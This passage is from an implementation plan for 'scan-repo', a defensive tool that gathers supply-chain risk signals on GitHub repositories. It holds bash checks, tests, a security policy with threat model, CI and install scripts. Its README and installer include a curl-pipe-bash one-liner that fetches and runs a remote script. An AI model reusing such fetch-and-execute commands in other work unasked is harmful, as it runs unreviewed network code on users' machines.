                if echo "$CONTRIBS" | grep -qx "$m"; then OVERLAP=1; break; fi
            done
            if [[ "$OVERLAP" -eq 0 ]]; then
                WARNS=$((WARNS+1))
                first_m="$(echo "$MAINTAINERS" | head -1)"
                FINDINGS+=("⚠ npm package \"$NPM_NAME\" published by \"$first_m\" — no visible overlap with repo owner or top 30 contributors")
                FINDINGS+=("     https://www.npmjs.com/~$first_m")
            else
                FINDINGS+=("✓ npm publisher overlaps repo contributors")
            fi

            MODIFIED="$(echo "$NPM_JSON" | jq -r '.time.modified // empty')"
            VERSIONS_COUNT="$(echo "$NPM_JSON" | jq -r '.versions | length')"
            if [[ -n "$MODIFIED" && "$VERSIONS_COUNT" -gt 1 ]]; then
                mod_age=$(age_days "$MODIFIED")
                if [[ "$mod_age" -lt 7 ]]; then
                    WARNS=$((WARNS+1))
                    FINDINGS+=("⚠ npm package was modified within last 7 days — verify changelog matches release")
                fi
            fi
        fi
    fi
fi

if [[ "$CHECK8_RAN" -eq 0 ]]; then
    SKIPS=$((SKIPS+1))
    FINDINGS+=("· Provenance check skipped — no published Node/Python package found")
fi
\`\`\`
```

- [ ] **Step 2: Append tests**

Insert before `report`:
```bash
assert_true "grep -q '### Check 6 — Install scripts (full)' '$SKILL'" \
    "skill: full check 6"
assert_true "grep -q '### Check 7 — Binaries in tree' '$SKILL'" \
    "skill: full check 7"
assert_true "grep -q '### Check 8 — Provenance' '$SKILL'" \
    "skill: full check 8"
assert_true "grep -q 'has_suspicious_pattern' '$SKILL'" \
    "skill: check 6 calls suspicious pattern helper"
assert_true "grep -q 'is_forbidden_executable' '$SKILL'" \
    "skill: check 7 calls forbidden-extension helper"
assert_true "grep -q 'is_in_recognized_build_path' '$SKILL'" \
    "skill: check 7 calls build-path helper"
assert_true "grep -q 'registry.npmjs.org' '$SKILL'" \
    "skill: check 8 hits npm registry"
```

- [ ] **Step 3: Run tests**

Run: `bash e:/GIT/repoguard/tests/test-skill-structure.sh`
Expected: 36 PASS.

- [ ] **Step 4: Commit**

```bash
cd e:/GIT/repoguard && git add skill/SKILL.md tests/test-skill-structure.sh && git commit -m "feat(skill): full audit checks 6, 7, 8"
```

---

### Task 20: Verdict, output, edge cases, self-test

**Files:**
- Modify: `e:/GIT/repoguard/skill/SKILL.md` (append)
- Modify: `e:/GIT/repoguard/tests/test-skill-structure.sh` (append before `report`)

- [ ] **Step 1: Append verdict + output sections**

Append to `skill/SKILL.md`:
```markdown

## Verdict & output (full audit)

\`\`\`bash
VERDICT_COLOR="$(compute_verdict "$HC_WARNS" "$WARNS" "$SKIPS")"
VERDICT_LINE="$(verdict_label "$VERDICT_COLOR")"

TOP_WARN=""
for f in "${FINDINGS[@]}"; do
    if [[ "$f" == ⚠* ]]; then
        TOP_WARN="${f#⚠ }"
        break
    fi
done

case "$VERDICT_COLOR" in
    green)  CLOSING='Looks fine to install if you trust the source. Want me to go ahead and install it?' ;;
    yellow) CLOSING="I'd suggest looking at \"${TOP_WARN}\" before deciding — want me to explain why that one's a concern?" ;;
    red)    CLOSING="I don't recommend installing this without expert review. Want me to explain what's concerning, or help you find an alternative?" ;;
    white)  CLOSING="I couldn't get enough information to assess this repo. Want me to retry, or look for alternatives?" ;;
esac

echo
echo "$VERDICT_LINE"
echo
echo "Repo: $OWNER_REPO  (https://github.com/$OWNER_REPO)"
echo "Ecosystem: $ECOSYSTEMS"
echo
echo "Findings"
for f in "${FINDINGS[@]}"; do
    echo "  $f"
done
echo
echo "Known limitations of this scan: did not inspect transitive dependencies; did not"
echo "execute or sandbox anything; thresholds are unvalidated heuristics."
echo
echo "$CLOSING"
\`\`\`

## Edge cases

- **Repo 404 / private:** `gh api repos/$OWNER_REPO` returns non-zero
  exit. Catch and print: `scan-repo: cannot access $OWNER_REPO (404 or
  private). No verdict.` then exit 0.
- **`gh` not installed:** Print install link, exit 0.
- **`gh` unauthenticated:** prepend warning to report.
- **Rate limit hit mid-run:** mark check `skip`, continue.
- **`curl` exceeds size/time limit:** treat as missing fetch; check
  emits `· skipped (fetch exceeded limit — possible DoS)`.
- **`/scan-repo` with no URL:** slash command file short-circuits.

## Self-test

\`\`\`bash
if [[ "${1:-}" == "--self-test" ]]; then
    GOOD_LIST="$HOME/.claude/skills/scan-repo/known-good.txt"
    [[ ! -f "$GOOD_LIST" ]] && GOOD_LIST="$(dirname "$HELPERS")/known-good.txt"
    URLS=( $(grep -vE '^[[:space:]]*(#|$)' "$GOOD_LIST") )
    PICK="${URLS[$(( RANDOM % ${#URLS[@]} ))]}"
    echo "self-test: scanning $PICK"
    INPUT="Invocation mode: explicit. Run scan-repo on $PICK" exec bash "$0"
fi
\`\`\`
```

- [ ] **Step 2: Append tests**

Insert before `report`:
```bash
assert_true "grep -q '## Verdict & output' '$SKILL'" \
    "skill: verdict & output section"
assert_true "grep -q 'compute_verdict' '$SKILL'" \
    "skill: full audit calls compute_verdict"
assert_true "grep -q 'verdict_label' '$SKILL'" \
    "skill: full audit calls verdict_label"
assert_true "grep -q 'I.\?d suggest looking at' '$SKILL'" \
    "skill: yellow directive closing"
assert_true "grep -q 'I don.\?t recommend installing' '$SKILL'" \
    "skill: red directive closing"
assert_true "grep -q '## Edge cases' '$SKILL'" \
    "skill: edge cases section"
assert_true "grep -q '## Self-test' '$SKILL'" \
    "skill: self-test section"
```

- [ ] **Step 3: Run tests**

Run: `bash e:/GIT/repoguard/tests/test-skill-structure.sh`
Expected: 43 PASS.

- [ ] **Step 4: Commit**

```bash
cd e:/GIT/repoguard && git add skill/SKILL.md tests/test-skill-structure.sh && git commit -m "feat(skill): verdict, directive closing, edge cases, self-test"
```

---

## Phase 5: Open-source packaging

### Task 21: SECURITY.md

**Files:**
- Create: `e:/GIT/repoguard/SECURITY.md`

- [ ] **Step 1: Write SECURITY.md**

Create `e:/GIT/repoguard/SECURITY.md`:
```markdown
# Security Policy

## What this project is

scan-repo is a *signal-gathering* tool for github.com repositories. It
reads metadata via the GitHub API, fetches a small set of manifest files
via HTTPS, and prints a soft, deflating verdict. It **does not** clone,
execute, sandbox, or otherwise interact with the target repository's
code.

## What this project explicitly is NOT

- Not a malware scanner.
- Not a supply-chain security product.
- Not a replacement for reading install scripts manually.
- Not a substitute for established security review practices.

Users who treat a 🟢 verdict as "safe to install" are misusing the tool.
The verdict wording ("proceed if you trust the source") is designed to
prevent this misuse.

## Reporting a security issue

### Issues with the scan-repo tool itself

(e.g., a shell-injection vulnerability in helpers.sh, credential leaks,
tampering with the user's gh/npm/pypi tokens)

Please email **security@[maintainer-domain]** — do NOT open a public
issue. Include:

- A minimal reproduction.
- What you expected vs. what happened.
- Your environment (OS, bash version, gh version).

We'll acknowledge within 7 days and aim to ship a fix within 30 days.

### Missed attack vectors or bypasses

(e.g., a real malicious repo that scan-repo failed to flag, or a
technique that tuned past all checks)

Open a public issue using the "Report a missed attack" template. This
is not a vulnerability in scan-repo itself; it's a calibration gap we
want to study openly.

## Threat model (what scan-repo does NOT protect against)

- **Transitive dependencies.** v1 only inspects the target repo's
  manifest. A malicious dep three levels down is invisible.
- **Runtime behavior.** scan-repo never executes the target code.
  Behavior at runtime (telemetry, exfiltration on first import, etc.)
  is out of scope.
- **Tuned attacks.** The full check list is published in SKILL.md.
  Attackers who read it can tune around every threshold.
- **Post-install tampering.** A repo that is clean when scanned can
  become malicious after a maintainer compromise.
- **You trusting the scan.** The verdict is plaintext in your terminal,
  unsigned. There is no chain of custody.

## Privacy

scan-repo issues API calls using the user's own `gh` authentication
token. These calls are visible in GitHub's access logs attributable to
the user. No scan data is transmitted to any third party.
```

- [ ] **Step 2: Commit**

```bash
cd e:/GIT/repoguard && git add SECURITY.md && git commit -m "docs: SECURITY.md policy + threat model"
```

---

### Task 22: CONTRIBUTING.md

**Files:**
- Create: `e:/GIT/repoguard/CONTRIBUTING.md`

- [ ] **Step 1: Write CONTRIBUTING.md**

Create `e:/GIT/repoguard/CONTRIBUTING.md`:
```markdown
# Contributing to scan-repo

Thanks for the interest. This project is intentionally small and
opinionated. Contributions that align with the design philosophy are
warmly welcomed.

## Design philosophy (short version)

1. Transparent playbook, not compiled code. SKILL.md ships in plaintext.
2. Signals, not verdicts. Every output carries its own caveat.
3. Calibration has teeth: `tools/calibration-check.sh` + the pre-commit
   hook block SKILL.md changes that spam warns on known-good repos.
4. Read-only. Never clones, never executes anything from target repos.
5. Cross-platform: Linux, macOS, Windows (git-bash, msys2).

Read `docs/superpowers/specs/2026-04-14-scan-repo-design.md` (v7) for
the full rationale.

## Ways to contribute

### Report a false positive

You ran scan-repo on a repo you know is legitimate and got a warn or
🟡 verdict that looks wrong.

→ Open an issue using the **false-positive** template.

### Report a missed attack

You found a malicious repo that scan-repo failed to flag.

→ Open an issue using the **missed-attack** template. These go into
`docs/superpowers/specs/calibration/known-bad.txt` once triaged.

### Propose a new check

→ Open an issue using the **new-check** template. Requirements:

- One-line description of what it detects.
- Honest estimate of false-positive rate.
- Whether it qualifies as a *deterministic* (high-confidence) signal
  or a threshold heuristic.
- Proposed ecosystem applicability.

### Contribute a known-good URL

Add to `docs/superpowers/specs/calibration/known-good.txt`.
Requirements:
- Multi-year history, multiple contributors, real downstream usage.
- A short comment explaining why it's a good test case.

### Contribute a known-bad URL

Add to `docs/superpowers/specs/calibration/known-bad.txt`. Requirements:
- Sourced from a published advisory (Snyk, Socket.dev, GitHub Security
  Advisories, academic dataset).
- The source of the label must be documented in the line comment.
- DO NOT fabricate entries. An incorrect known-bad entry both poisons
  calibration and risks pointing users at innocent repos.

### Tune thresholds

Thresholds in `tools/helpers.sh` and `skill/SKILL.md` are placeholders.
Calibration proposals are welcome. Workflow:

1. Reproduce the false positive or false negative.
2. Propose a threshold change.
3. Run `tools/calibration-check.sh` against the known-good list.
4. If the change introduces new warns on known-good repos, either:
   - Tune further, or
   - Add to `docs/superpowers/specs/calibration/justified-warns.md`
     with a written justification.

## Development setup

```
git clone https://github.com/sepivip/scan-repo
cd scan-repo
./tools/install.sh             # install to ~/.claude/
./tools/install-hooks.sh       # wire the pre-commit calibration gate
bash tests/test-helpers.sh           # unit tests
bash tests/test-skill-structure.sh   # structural validation
bash tests/test-calibration.sh       # calibration script tests
```

Required tools: `bash` 4+, `gh` (authenticated), `curl`, `jq`.

## Pull request checklist

- [ ] Tests pass locally on your platform
- [ ] CI passes (runs on Linux, macOS, Windows)
- [ ] If you changed SKILL.md or helpers.sh, calibration passes (the
      pre-commit hook enforces this)
- [ ] You've read the design spec
- [ ] CHANGELOG.md updated with a one-line entry under "Unreleased"

## Code style

- Pure bash; no external deps beyond coreutils, `gh`, `curl`, `jq`.
- Cross-platform: test with GNU date (Linux) *and* BSD date (macOS).
- Short functions with a one-line comment describing purpose and return.
- Tests for every deterministic helper.

## License

By contributing, you agree your contributions will be licensed under
the MIT License (see LICENSE).
```

- [ ] **Step 2: Commit**

```bash
cd e:/GIT/repoguard && git add CONTRIBUTING.md && git commit -m "docs: CONTRIBUTING.md with workflow and philosophy"
```

---

### Task 23: CHANGELOG.md

**Files:**
- Create: `e:/GIT/repoguard/CHANGELOG.md`

- [ ] **Step 1: Write CHANGELOG.md**

Create `e:/GIT/repoguard/CHANGELOG.md`:
```markdown
# Changelog

All notable changes to scan-repo are documented here.

The format is based on [Keep a Changelog](https://keepachangelog.com/en/1.1.0/),
and this project adheres to [Semantic Versioning](https://semver.org/).

## [Unreleased]

## [0.1.0] — 2026-04-14

First public release.

### Added
- SKILL.md playbook for scan-repo (transparent, no compiled code).
- `/scan-repo <url>` slash command for full audit.
- Auto-trigger on intent tokens + GitHub URL in user message.
- Quick-check tier (3 cheapest checks, ~5–10s) and full audit (8 checks, ~30–60s).
- Soft verdicts: 🟢 / 🟡 / 🔴 / ⚪, each with its caveat in the label.
- Deterministic helpers in `tools/helpers.sh` (URL extraction, intent
  detection, suspicious-pattern regex, benign allowlist, forbidden-extension
  classifier, build-path classifier, empty-profile detector, verdict
  computation, portable date math).
- Calibration script (`tools/calibration-check.sh`) and pre-commit hook.
- Cross-platform: Linux, macOS, Windows (git-bash).
- CI on three platforms via GitHub Actions.
- MIT License.

### Known limitations
- Does not recurse into `package-lock.json` / `requirements.txt` (v2).
- Does not inspect Python build-backend (PEP 517) hooks, `conftest.py`,
  or `.pth` auto-imports (v2).
- Thresholds are unvalidated heuristics pending calibration.
- `known-bad.txt` intentionally empty — population is a v1.1 prerequisite.
```

- [ ] **Step 2: Commit**

```bash
cd e:/GIT/repoguard && git add CHANGELOG.md && git commit -m "docs: CHANGELOG.md with 0.1.0 release notes"
```

---

### Task 24: Issue and PR templates

**Files:**
- Create: `e:/GIT/repoguard/.github/ISSUE_TEMPLATE/false-positive.yml`
- Create: `e:/GIT/repoguard/.github/ISSUE_TEMPLATE/missed-attack.yml`
- Create: `e:/GIT/repoguard/.github/ISSUE_TEMPLATE/new-check.yml`
- Create: `e:/GIT/repoguard/.github/ISSUE_TEMPLATE/config.yml`
- Create: `e:/GIT/repoguard/.github/PULL_REQUEST_TEMPLATE.md`

- [ ] **Step 1: Write false-positive.yml**

Create `e:/GIT/repoguard/.github/ISSUE_TEMPLATE/false-positive.yml`:
```yaml
name: Report a false positive
description: scan-repo flagged a known-legitimate repository
title: "[FP] <owner/repo>"
labels: ["false-positive"]
body:
  - type: input
    id: repo_url
    attributes:
      label: Repository URL
      description: The github.com URL that was scanned
      placeholder: https://github.com/owner/repo
    validations:
      required: true
  - type: textarea
    id: output
    attributes:
      label: scan-repo output
      description: Paste the full output (findings + verdict line).
      render: text
    validations:
      required: true
  - type: textarea
    id: why_legit
    attributes:
      label: Why is this repo legitimate?
      description: Evidence — maintainership, downstream usage, known org, etc.
    validations:
      required: true
  - type: dropdown
    id: which_check
    attributes:
      label: Which check fired?
      multiple: true
      options:
        - "1 — Author profile"
        - "2 — Repo basics"
        - "3 — Stargazer sample"
        - "4 — Activity ratios"
        - "6 — Install scripts"
        - "7 — Binaries in tree"
        - "8 — Provenance"
    validations:
      required: true
  - type: input
    id: env
    attributes:
      label: Environment
      description: OS, bash version, gh version
      placeholder: "macOS 14.4, bash 5.2.15, gh 2.42.0"
```

- [ ] **Step 2: Write missed-attack.yml**

Create `e:/GIT/repoguard/.github/ISSUE_TEMPLATE/missed-attack.yml`:
```yaml
name: Report a missed attack
description: A malicious repo that scan-repo failed to flag
title: "[MISS] <owner/repo>"
labels: ["missed-attack"]
body:
  - type: markdown
    attributes:
      value: |
        **Do NOT link live malware** in the description. Instead, link to
        a published advisory (Snyk, Socket, GHSA, academic paper).
  - type: input
    id: advisory
    attributes:
      label: Source advisory
      description: Published URL identifying the repo as malicious
      placeholder: https://github.com/advisories/GHSA-xxxx
    validations:
      required: true
  - type: input
    id: repo_url
    attributes:
      label: Repository URL
      description: Only if the repo is still up on GitHub — otherwise leave blank
      placeholder: https://github.com/owner/repo
  - type: textarea
    id: attack_vector
    attributes:
      label: Attack vector
      description: What did the malicious repo do?
    validations:
      required: true
  - type: textarea
    id: scan_output
    attributes:
      label: scan-repo output
      description: What did scan-repo say when you ran it on this repo?
      render: text
  - type: textarea
    id: missing_signal
    attributes:
      label: What signal(s) would have caught this?
      description: Proposal for a new check or threshold change
```

- [ ] **Step 3: Write new-check.yml**

Create `e:/GIT/repoguard/.github/ISSUE_TEMPLATE/new-check.yml`:
```yaml
name: Propose a new check
description: Add a new signal to scan-repo
title: "[CHECK] <one-line description>"
labels: ["new-check"]
body:
  - type: textarea
    id: description
    attributes:
      label: What does the check detect?
      description: One sentence
    validations:
      required: true
  - type: dropdown
    id: confidence
    attributes:
      label: Signal type
      options:
        - "Deterministic (high-confidence — forces 🔴 verdict)"
        - "Threshold heuristic (caps at 🟡 until calibrated)"
    validations:
      required: true
  - type: textarea
    id: false_positive_estimate
    attributes:
      label: Expected false-positive rate
      description: Be honest — what legitimate repos might this also fire on?
    validations:
      required: true
  - type: dropdown
    id: ecosystems
    attributes:
      label: Ecosystem applicability
      multiple: true
      options:
        - Node / npm
        - Python / PyPI
        - Rust / Cargo
        - Go / go.mod
        - Ruby / RubyGems
        - JVM / Maven / Gradle
        - PHP / Composer
        - All (ecosystem-independent)
  - type: textarea
    id: reference
    attributes:
      label: Reference / prior art
      description: Advisories, papers, or existing tools doing something similar
```

- [ ] **Step 4: Write config.yml**

Create `e:/GIT/repoguard/.github/ISSUE_TEMPLATE/config.yml`:
```yaml
blank_issues_enabled: false
contact_links:
  - name: Security vulnerability in scan-repo itself
    url: https://github.com/sepivip/scan-repo/security/advisories/new
    about: Private disclosure channel — see SECURITY.md
```

- [ ] **Step 5: Write PULL_REQUEST_TEMPLATE.md**

Create `e:/GIT/repoguard/.github/PULL_REQUEST_TEMPLATE.md`:
```markdown
## What does this change?

Brief description of the change.

## Why?

Motivation / linked issue.

## Checklist

- [ ] Tests pass locally on my platform
- [ ] If I changed `skill/SKILL.md` or `tools/helpers.sh`, calibration passes
      (the pre-commit hook enforces this)
- [ ] I've updated `CHANGELOG.md` under "Unreleased"
- [ ] I've read the design spec (`docs/superpowers/specs/`)

## For new checks or threshold changes

- [ ] Honest false-positive estimate in the PR description
- [ ] Ran against `known-good.txt` — results attached
- [ ] If new warns surfaced on known-good repos, I've either tuned
      further or documented them in `justified-warns.md`
```

- [ ] **Step 6: Commit**

```bash
cd e:/GIT/repoguard && git add .github/ISSUE_TEMPLATE/ .github/PULL_REQUEST_TEMPLATE.md && git commit -m "docs: issue & PR templates"
```

---

### Task 25: CI workflow

**Files:**
- Create: `e:/GIT/repoguard/.github/workflows/ci.yml`

- [ ] **Step 1: Write the workflow**

Create `e:/GIT/repoguard/.github/workflows/ci.yml`:
```yaml
name: CI

on:
  push:
    branches: [main]
  pull_request:
    branches: [main]

jobs:
  test:
    strategy:
      fail-fast: false
      matrix:
        os: [ubuntu-latest, macos-latest, windows-latest]
    runs-on: ${{ matrix.os }}
    steps:
      - uses: actions/checkout@v4

      - name: Install dependencies (macOS)
        if: matrix.os == 'macos-latest'
        run: brew install jq

      - name: Install dependencies (Ubuntu)
        if: matrix.os == 'ubuntu-latest'
        run: sudo apt-get update && sudo apt-get install -y jq

      - name: Install dependencies (Windows)
        if: matrix.os == 'windows-latest'
        shell: bash
        run: |
          # jq is pre-installed on windows-latest git-bash
          jq --version

      - name: Run helper tests
        shell: bash
        run: bash tests/test-helpers.sh

      - name: Run skill structure tests
        shell: bash
        run: bash tests/test-skill-structure.sh

      - name: Run calibration tests
        shell: bash
        run: bash tests/test-calibration.sh

  lint:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: ShellCheck
        uses: ludeeus/action-shellcheck@master
        with:
          scandir: tools
          additional_files: tests/test-framework.sh tests/test-helpers.sh tests/test-skill-structure.sh tests/test-calibration.sh
```

- [ ] **Step 2: Commit**

```bash
cd e:/GIT/repoguard && git add .github/workflows/ci.yml && git commit -m "ci: run tests on Linux, macOS, Windows + shellcheck"
```

---

### Task 26: Local install script

**Files:**
- Create: `e:/GIT/repoguard/tools/install.sh`

- [ ] **Step 1: Write install.sh**

Create `e:/GIT/repoguard/tools/install.sh`:
```bash
#!/usr/bin/env bash
# Install scan-repo as a Claude Code skill + slash command.
# Idempotent — overwrites previous install.

set -euo pipefail

REPO_ROOT="$(cd "$(dirname "$0")/.." && pwd)"
SKILL_SRC="$REPO_ROOT/skill/SKILL.md"
HELPERS_SRC="$REPO_ROOT/tools/helpers.sh"
COMMAND_SRC="$REPO_ROOT/skill/scan-repo.command.md"
GOOD_LIST_SRC="$REPO_ROOT/docs/superpowers/specs/calibration/known-good.txt"

SKILL_DIR="$HOME/.claude/skills/scan-repo"
COMMAND_DIR="$HOME/.claude/commands"
COMMAND_DST="$COMMAND_DIR/scan-repo.md"

for f in "$SKILL_SRC" "$HELPERS_SRC" "$COMMAND_SRC" "$GOOD_LIST_SRC"; do
    [[ -f "$f" ]] || { echo "install: missing source: $f" >&2; exit 1; }
done

# Check dependencies
command -v gh >/dev/null 2>&1 || { echo "install: gh CLI not found — https://cli.github.com/" >&2; exit 1; }
command -v jq >/dev/null 2>&1 || { echo "install: jq not found — install jq first" >&2; exit 1; }

mkdir -p "$SKILL_DIR" "$COMMAND_DIR"

cp "$SKILL_SRC"     "$SKILL_DIR/SKILL.md"
cp "$HELPERS_SRC"   "$SKILL_DIR/helpers.sh"
cp "$GOOD_LIST_SRC" "$SKILL_DIR/known-good.txt"
cp "$COMMAND_SRC"   "$COMMAND_DST"

chmod +x "$SKILL_DIR/helpers.sh"

echo "install: scan-repo installed."
echo "  skill:    $SKILL_DIR/"
echo "  command:  $COMMAND_DST"
echo
echo "Try it:"
echo "  /scan-repo https://github.com/anthropics/claude-code"
```

- [ ] **Step 2: Make executable, test, verify**

```bash
chmod +x e:/GIT/repoguard/tools/install.sh
bash e:/GIT/repoguard/tools/install.sh
ls "$HOME/.claude/skills/scan-repo/"
```
Expected: `SKILL.md`, `helpers.sh`, `known-good.txt` all present.

- [ ] **Step 3: Commit**

```bash
cd e:/GIT/repoguard && git add tools/install.sh && git commit -m "feat(tooling): install.sh deploys skill to ~/.claude"
```

---

### Task 27: One-liner installer (bin/install)

**Files:**
- Create: `e:/GIT/repoguard/bin/install`

- [ ] **Step 1: Write bin/install**

Create `e:/GIT/repoguard/bin/install`:
```bash
#!/usr/bin/env bash
# scan-repo one-liner installer.
#
# Usage:
#   curl -sL https://raw.githubusercontent.com/sepivip/scan-repo/main/bin/install | bash
#
# Clones the repo to ~/.local/share/scan-repo and runs tools/install.sh.

set -euo pipefail

REPO_URL="https://github.com/sepivip/scan-repo"
INSTALL_DIR="${SCAN_REPO_INSTALL_DIR:-$HOME/.local/share/scan-repo}"

command -v git >/dev/null 2>&1 || { echo "install: git not found" >&2; exit 1; }
command -v gh  >/dev/null 2>&1 || { echo "install: gh CLI not found — https://cli.github.com/" >&2; exit 1; }
command -v jq  >/dev/null 2>&1 || { echo "install: jq not found — install jq first" >&2; exit 1; }

if [[ -d "$INSTALL_DIR/.git" ]]; then
    echo "install: updating existing checkout at $INSTALL_DIR"
    git -C "$INSTALL_DIR" pull --ff-only
else
    echo "install: cloning $REPO_URL → $INSTALL_DIR"
    mkdir -p "$(dirname "$INSTALL_DIR")"
    git clone --depth 1 "$REPO_URL" "$INSTALL_DIR"
fi

bash "$INSTALL_DIR/tools/install.sh"

echo
echo "Next steps:"
echo "  1. Open Claude Code"
echo "  2. Try: /scan-repo https://github.com/anthropics/claude-code"
echo
echo "To uninstall:"
echo "  rm -rf ~/.claude/skills/scan-repo"
echo "  rm ~/.claude/commands/scan-repo.md"
echo "  rm -rf $INSTALL_DIR"
```

- [ ] **Step 2: Make executable**

```bash
chmod +x e:/GIT/repoguard/bin/install
```

- [ ] **Step 3: Structural validation**

```bash
head -1 e:/GIT/repoguard/bin/install
grep -F "sepivip/scan-repo" e:/GIT/repoguard/bin/install
```
Expected: shebang line, repo URL present.

- [ ] **Step 4: Commit**

```bash
cd e:/GIT/repoguard && git add bin/install && git commit -m "feat(tooling): one-liner curl-pipe-bash installer"
```

---

## Phase 6: README and integration

### Task 28: Public README

**Files:**
- Create: `e:/GIT/repoguard/README.md`

- [ ] **Step 1: Write README.md**

Create `e:/GIT/repoguard/README.md`:
```markdown
<div align="center">

# scan-repo

**Pre-flight safety check for GitHub repos, for Claude Code.**

[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
[![CI](https://github.com/sepivip/scan-repo/actions/workflows/ci.yml/badge.svg)](https://github.com/sepivip/scan-repo/actions/workflows/ci.yml)
![Platform](https://img.shields.io/badge/platform-Linux%20%7C%20macOS%20%7C%20Windows-blue)
[![Last commit](https://img.shields.io/github/last-commit/sepivip/scan-repo)](https://github.com/sepivip/scan-repo)

*A Claude Code skill that checks a GitHub repo for safety signals before you install it — without cloning, without running anything.*

</div>

---

## Why

In 2024, Carnegie Mellon's StarScout found 6 million fake GitHub stars
across 15,835 repos. Recent campaigns impersonate leaked source code,
popular AI tools, Claude Code plugins — ship infostealers, deploy via
`npm install` postinstall hooks. The dangerous moment is the *first*
one: you clone, you `npm install`, and a malicious hook has already
run.

scan-repo is an agent-mediated pre-flight check. You ask Claude "should
I install `<url>`?" — the skill silently runs three fast safety checks
and tells Claude whether anything unusual turned up. If you want the
full 8-check audit, type `/scan-repo <url>`.

## Soft verdicts

The skill emits a verdict that carries its caveat in the label itself —
so it can't be stripped to "SAFE":

| Verdict | Meaning |
|---|---|
| 🟢 Nothing obviously wrong | proceed if you trust the source |
| 🟡 A few things look unusual | worth a closer look |
| 🔴 Several things look concerning | recommend not installing without expert review |
| ⚪ Couldn't gather enough signal | cannot assess |

The verdict is for your agent, not for you. Claude explains findings in
plain English on the next turn.

## Install

Requires `bash`, `gh` (authenticated), `curl`, `jq`.

**One-liner:**
```
curl -sL https://raw.githubusercontent.com/sepivip/scan-repo/main/bin/install | bash
```

**Or clone + run:**
```
git clone https://github.com/sepivip/scan-repo
cd scan-repo
./tools/install.sh
```

Then in Claude Code:
```
/scan-repo https://github.com/anthropics/claude-code
```

Or just ask naturally: *"should I install https://github.com/foo/bar?"*
— the skill auto-triggers on intent tokens.

## The 8 checks

| # | Check | What it looks at |
|---|---|---|
| 1 | Author profile | account age, public repos, followers |
| 2 | Repo basics | age, star count, archived/disabled, growth rate |
| 3 | Stargazer sample | % empty profiles across recent + random page |
| 4 | Activity ratios | contributors, open issues vs star count |
| 5 | Star history | link to star-history.com for eyeball check |
| 6 | Install scripts | regex patterns + benign allowlist (`node-gyp`, etc.) |
| 7 | Binaries in tree | forbidden installers (.exe, .msi, .deb…) by path |
| 8 | Provenance | npm/PyPI publisher overlap with repo contributors |

Full design rationale:
[`docs/superpowers/specs/2026-04-14-scan-repo-design.md`](docs/superpowers/specs/2026-04-14-scan-repo-design.md).

## What scan-repo is NOT

- **Not a safety guarantee.** Clean verdicts are expected on
  sophisticated campaigns.
- **Not a supply-chain audit.** Only inspects the target repo's
  manifest. Malicious transitive deps are a known v1 gap.
- **Not a secret playbook.** `SKILL.md` ships in plaintext. Tuned
  attackers can read every threshold.
- **Not validated.** Thresholds are placeholders pending calibration.

See [SECURITY.md](SECURITY.md) for the full threat model.

## How the auto-trigger stays out of the way

- Fires only when your message contains *both* a github.com URL *and*
  an intent token (`install`, `should I`, `is it safe`, etc.)
- Runs the 3 cheapest checks (~5–10s), not the full audit
- If everything passes → one ambient line, nothing interrupts
- If something trips → one warning line + "run `/scan-repo <url>` for full audit"
- Already scanned this conversation → silently references the prior result

## Develop / contribute

See [CONTRIBUTING.md](CONTRIBUTING.md).

```
bash tests/test-helpers.sh           # unit tests
bash tests/test-skill-structure.sh   # skill structure validation
bash tests/test-calibration.sh       # calibration script tests
```

The calibration check (`tools/calibration-check.sh`) runs scan-repo
against a list of known-good repos and blocks SKILL.md changes that
produce false-positive warn spam.

## License

MIT — see [LICENSE](LICENSE).
```

- [ ] **Step 2: Commit**

```bash
cd e:/GIT/repoguard && git add README.md && git commit -m "docs: public README with badges, install, design overview"
```

---

### Task 29: Self-review — dependencies, link checks

**Files:** none modified. Final cross-check before smoke test.

- [ ] **Step 1: Run all tests**

```bash
bash e:/GIT/repoguard/tests/test-helpers.sh
bash e:/GIT/repoguard/tests/test-skill-structure.sh
bash e:/GIT/repoguard/tests/test-calibration.sh
```
Expected: all PASS.

- [ ] **Step 2: Verify all markdown cross-references**

```bash
cd e:/GIT/repoguard
for f in README.md CONTRIBUTING.md SECURITY.md CHANGELOG.md; do
    echo "-- $f --"
    grep -oE '\([A-Za-z/._-]+\.md[^)]*\)' "$f" | tr -d '()' || true
done
```
Manually verify each referenced file exists.

- [ ] **Step 3: Verify install script works end-to-end**

```bash
bash e:/GIT/repoguard/tools/install.sh
ls "$HOME/.claude/skills/scan-repo/SKILL.md"
ls "$HOME/.claude/commands/scan-repo.md"
```

- [ ] **Step 4: Commit nothing — this is a verification task**

If any issue surfaced, fix it and commit the fix with message `fix: <what>`.

---

### Task 30: Manual integration smoke test (HUMAN GATE)

**This task requires a real Claude Code session.**

- [ ] **Step 1: Pick three URLs from the known-good list**

```bash
grep -vE '^[[:space:]]*(#|$)' e:/GIT/repoguard/docs/superpowers/specs/calibration/known-good.txt | head -3
```
Record the three URLs.

- [ ] **Step 2: Run `/scan-repo` on each in a fresh Claude Code session**

For each URL, record:
- Verdict color
- Number of warns
- Output rendered correctly
- Approximate time

- [ ] **Step 3: Test auto-trigger path**

In a fresh conversation, type: *"should I install `<url>`?"*
Record:
- Whether the skill auto-fired
- Quick-check verdict
- Was output a single line (not full audit)

- [ ] **Step 4: Document findings**

Append to `tests/verification-explicit-token.md`:
```markdown
## Smoke test — Phase 6 Task 30

Date: ____

| URL | Slash verdict | Warns | Auto-fired | Quick verdict |
|-----|--------------|-------|-----------|---------------|
| ... | ...          | ...   | ...       | ...           |

Notes / unexpected behavior: ____
```

- [ ] **Step 5: Commit results and triage any false positives**

If any known-good URL came back 🟡 or 🔴 with apparent false positives:
- Tune the threshold in `tools/helpers.sh` or `skill/SKILL.md`, re-run tests, or
- Document the warn as justified in `justified-warns.md`.

```bash
cd e:/GIT/repoguard && git add tests/verification-explicit-token.md docs/superpowers/specs/calibration/ && git commit -m "test: phase-6 smoke test against known-good URLs"
```

---

## Self-review

Map of spec v7 requirements → tasks:

- [ ] **Audience (vibe coders):** ✓ Tasks 13, 28 (description + README).
- [ ] **Soft verdicts with caveat in label:** ✓ Task 8 (`verdict_label`), Task 20.
- [ ] **Layered gating (Steps 0/1/2/3):** ✓ Task 14.
- [ ] **Intent-token gate:** ✓ Task 4 (`has_intent_token`), Task 14.
- [ ] **Memoization (best-effort):** ✓ Task 14 Step 3.
- [ ] **Ecosystem detection (multi-ecosystem union):** ✓ Task 15.
